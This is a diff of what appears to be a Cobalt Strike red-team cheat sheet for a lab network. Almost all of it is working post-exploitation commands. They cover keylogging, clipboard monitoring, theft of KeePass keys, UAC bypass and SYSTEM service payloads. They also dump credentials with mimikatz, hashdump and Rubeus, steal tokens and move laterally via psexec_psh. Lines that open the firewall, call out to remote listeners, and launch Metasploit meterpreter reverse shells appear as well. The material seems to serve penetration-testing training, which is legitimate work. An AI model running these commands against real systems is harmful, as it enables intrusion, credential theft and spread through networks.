@@ -179,17 +179,24 @@ ctrl+k will clear the current window.
 
 # Enumerate host
 
-getuid                                            Get User ID
-ps                                                Show process list
+Seatbelt					  Part of https://github.com/Flangvik/SharpCollection
+execute-assembly /opt/Seatbelt.exe -group=system
+execute-assembly /opt/Seatbelt.exe -group=user
 
 keylogger <PID> x64                               Inject a keystroke logger into a process
-                                                    View > Keylogger > select item in lower left pane
+                                                  View > Keylogger > select item in lower left pane
 
 https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Start-ClipboardMonitor.ps1
 psinject <PID> x64 Start-ClipboardMonitor -CollectionLimit 5
 
 screenshot <PID> x64                              Take a screenshot
-                                                    View > Screenshots > select item in lower left pane
+                                                  View > Screenshots > select item in lower left pane
+
+KeeThief					  https://github.com/GhostPack/KeeThief
+powershell Get-KeePassDatabaseKey
+
+getuid                                            Get User ID
+ps                                                Show process list
 
 pwd                                               Print current directory
 ls                                                List files
@@ -226,56 +233,56 @@ net view                                          List hosts in a domain (browse
 jobs                                              List long-running post-exploitation tasks. Look for keylogger JID
 jobkill <JID>                                     Kill a long-running post-exploitation task. Kill the keylogger using its JID
 jobs                                              Verify the keylogger is no longer running
-
-Seatbelt
-    Download https://github.com/GhostPack/Seatbelt to a Windows attack VM.
-    Open C:\Downloads\Seatbelt\Seatbelt.sln with Visual Studio.
-    Build > Build Solution.
-    There will be no output on the screen.
-    This wil compile to C:\Downloads\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe.
-    Transfer this file to your Kali VM or run Cobalt Strike from the same Windows VM.
-    beacon> execute-assembly /opt/Seatbelt.exe -group=system
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # PowerShell weaponization
 
-powershell <cmdlet> <args>                        Starts powershell.exe
-powerpick <cmdlet> <args>                         Spawns a sacrificial process specified by spawnto and injects unmanaged PS into it
-psinject <PID> <arch> <cmdlet> <args>             Injects unmanaged PS into a specified process
+powershell <cmdlet> <args>                        Starts powershell.exe and uses the highest supported PowerShell version
+powerpick <cmdlet> <args>                         Spawns a sacrificial process specified by spawnto and injects UnmanagedPowerShell into it
+psinject <PID> <arch> <cmdlet> <args>             Injects UnmanagedPowerShell into the specified process
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Escalate privileges
+# Privilege Escalation
 
 powershell-import /opt/PowerSploit/Privesc/PowerUp.ps1
 powershell Invoke-PrivescAudit
 
-SharpUp is a C# port of PowerUp, not all checks are ported.
+SharpUp is a C# port of PowerUp			  Part of https://github.com/Flangvik/SharpCollection
+Not all checks are ported.
 execute-assembly /opt/GhostPack/SharpUp/SharpUp.exe
+
+elevate uac-token-duplication                     Bypass UAC, this gives you a pseudo-high integrity token
+elevate svc-exe                                   Creates a SYSTEM service that will run our payload
+
+https://github.com/rasta-mouse/Watson		  Part of https://github.com/Flangvik/SharpCollection
 
 powerpick Invoke-ServiceAbuse -Name 'crappy-service'
 spawnas john Password123! smb
 Select john in the top pane > right-click > Interact
 bypassuac http
-
 john should now be running in a high integrity Beacon (see asterisk)
-
-Dump passwords
-    logonpasswords
-    menu View > Credentials
-
-    ps
-    Look for another user logged in and copy the PID of their process.
-    inject <PID> <arch> <listener>
-    inject 5678 x64 smb
-    Select the new user in the top pane > right-click > Interact
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Bypass UAC
+# Credential Abuse
 
-elevate uac-token-duplication
+make_token DOMAIN\user password
+
+inject <PID> x64 >listener>
+
+steal_token <PID>
+
+mimikatz !lsadump::sam
+
+SharpDump					  Part of https://github.com/Flangvik/SharpCollection
+
+execute-assembly /opt/Seatbelt.exe LSASettings
+execute-assembly /opt/Seatbelt.exe CredGuard
+execute-assembly /opt/Seatbelt.exe -q SecPackageCreds
+
+execute-assembly /opt/Rubeus.exe dump
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Lateral Movement
+# Lateral Movement
 
 Always use a FQDN instead of an IP.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -297,26 +304,27 @@ Create http and smb listeners.
 
 Launch an attack to gain a foothold.
 
-Login to wkstn-02 as Administrator, open a command prompt, and paste in the PowerShell.
+Login to wkstn-10 as Administrator, open a command prompt, and paste in the PowerShell.
 You should have an http Beacon on Cobalt Strike in about 10 sec.
 
 Right-click on the new http Beacon > Interact
-sleep 2                                           Make the Beacon interactive
+sleep 0                                           Make the Beacon interactive
 note foothold
+
 ps                                                Look for another user logged in
-inject <PID> <Arch> <listener>
+inject <PID> <arch> <listener>
 inject 5678 x64 smb
 Right-click on the new smb Beacon > Interact
 hashdump                                          Recover local account password hashes
 logonpasswords                                    Harvest credentials with mimikatz
 View > Credentials
 
-net view /domain                                  Show the domain
+net view /domain
 make_token site\administrator password
 net group "Domain Computers" /DOMAIN              Show computers joined to the domain
 shell nltest /dclist:SITE                         Locate the domain controller
-ls \\wkuser-70\C$                                 Test remote access
-psexec_psh wkuser-70 smb                          You should have a new smb Beacon in about 10 sec
+ls \\wkuser-20\C$                                 Test remote access
+psexec_psh wkuser-20 smb                          You should have a new smb Beacon in about 10 sec
 
 Right-click on the new smb Beacon > Interact
 sleep 2                                           Have the Beacon check in once every 2 seconds
@@ -329,7 +337,7 @@ ls \\site-file\C$
 psexec_psh site-file smb
 
 Right-click on the new http Beacon > Interact
-sleep 2                                           Have the Beacon check in once every 2 seconds
+sleep 2
 note 2nd hop
 ps
 hashdump
@@ -339,7 +347,7 @@ ls \\site-dc\C$
 psexec_psh site-dc smb	
 	
 Right-click on the new http Beacon > Interact
-sleep 2                                           Have the Beacon check in once every 2 seconds
+sleep 2
 note 3rd hop
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -359,61 +367,3 @@ shell
 netsh advfirewall firewall delete rule  name="fpipeknockoff" program="\\site-file\share\fpipeknockoff.windows.amd64.exe" & netsh advfirewall firewall add rule name="fpipeknockoff" dir=in action=allow program="\\site-file\share\fpipeknockoff.windows.amd64.exe" enable=yes & \\site-file\share\fpipeknockoff.windows.amd64.exe -c 10.0.0.80:443 <NUL >NUL 2>NUL & exit
 run post/multi/manage/autoroute CMD=add netmask=/32 subnet=172.31.2.66
 background
-
-# Make connection to wkuser-66
-use exploit/windows/smb/psexec_psh
-set payload windows/x64/meterpreter/reverse_tcp
-set rhost 172.31.2.66
-set service_name acme
-set smbdomain site
-set smbpass password
-set smbuser administrator
-set lhost 172.31.2.6
-set lport 4444
-set ReverseListenerBindAddress 0.0.0.0
-set ReverseListenerBindPort 443
-run
-migrate -N svchost.exe
-
-# Make tunnels for site-mail
-shell
-netsh advfirewall firewall delete rule name="fpipeknockoff" program="\\site-file\share\fpipeknockoff.windows.amd64.exe" & netsh advfirewall firewall add rule name="fpipeknockoff" dir=in action=allow program="\\site-file\share\fpipeknockoff.windows.amd64.exe" enable=yes & \\site-file\share\fpipeknockoff.windows.amd64.exe -c 172.31.2.6:4444 & exit
-run post/multi/manage/autoroute CMD=add netmask=/32 subnet=172.31.4.9
-background
-
-# Make connection to site-mail
-use exploit/windows/smb/psexec_psh
-set payload windows/x64/meterpreter/reverse_tcp
-set rhost 172.31.4.9
-set service_name acme
-set smbdomain site
-set smbpass password
-set smbuser administrator
-set lhost 172.31.2.66
-set lport 4444
-set ReverseListenerBindAddress 0.0.0.0
-set ReverseListenerBindPort 443
-run
-migrate -N svchost.exe
-
-# Make tunnels to wkuser-72
-shell
-netsh advfirewall firewall delete rule  name="fpipeknockoff" program="\\site-file\share\fpipeknockoff.windows.amd64.exe" & netsh advfirewall firewall add rule name="fpipeknockoff" dir=in action=allow program="\\site-file\share\fpipeknockoff.windows.amd64.exe" enable=yes & \\site-file\share\fpipeknockoff.windows.amd64.exe -c 172.31.2.66:4444 & exit
-run post/multi/manage/autoroute CMD=add netmask=/32 subnet=172.31.2.72
-background
-
-# Make connection to wkuser-72
-use exploit/windows/smb/psexec_psh
-set payload windows/x64/meterpreter/reverse_tcp
-set rhost 172.31.2.72
-set service_name acme
-set smbdomain site
-set smbpass password
-set smbuser administrator
-set lhost 172.31.4.9
-set lport 4444
-set ReverseListenerBindAddress 0.0.0.0
-set ReverseListenerBindPort 443
-run
-migrate -N svchost.exe
-
